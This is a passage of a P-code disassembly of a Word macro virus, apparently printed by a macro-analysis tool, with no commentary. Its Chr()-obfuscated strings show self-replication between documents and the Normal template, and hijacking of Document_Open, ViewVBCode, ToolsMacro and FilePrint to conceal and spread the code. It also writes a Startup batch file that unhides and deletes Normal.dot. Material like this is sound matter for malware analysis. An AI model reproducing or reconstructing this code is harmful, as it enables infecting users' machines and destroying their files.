' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0003 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x000A 
' 	Sub 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld ad 
' 	ArgsMemCall AddFromString 0x0001 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #57:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #59:
' 	LineCont 0x0008 BE 00 00 00 F7 01 00 00
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0003 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0002 
' 	Sub 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Paren 
' 	Ld nt 
' 	ArgsMemCall AddFromString 0x0001 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #62:
' 	ExitSub 
' Line #63:
' 	Label Fuck 
' Line #64:
' 	Ld NormalTemplate 
' 	St Norm$ 
' Line #65:
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Attr$ 
' Line #66:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Path1$ 
' Line #67:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Path2$ 
' Line #68:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St DelCmd$ 
' Line #69:
' 	Ld Friend 
' 	St hFile 
' Line #70:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #71:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld vbCr 
' 	Ld vbLf 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #72:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Attr$ 
' 	Ld Path1$ 
' 	Add 
' 	Ld Norm$ 
' 	Add 
' 	PrintItemNL 
' Line #73:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Attr$ 
' 	Ld Path2$ 
' 	Add 
' 	Ld Norm$ 
' 	Add 
' 	PrintItemNL 
' Line #74:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld DelCmd$ 
' 	Ld Path1$ 
' 	Add 
' 	Ld Norm$ 
' 	Add 
' 	PrintItemNL 
' Line #75:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld DelCmd$ 
' 	Ld Path2$ 
' 	Add 
' 	Ld Norm$ 
' 	Add 
' 	PrintItemNL 
' Line #76:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #77:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld DelCmd$ 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
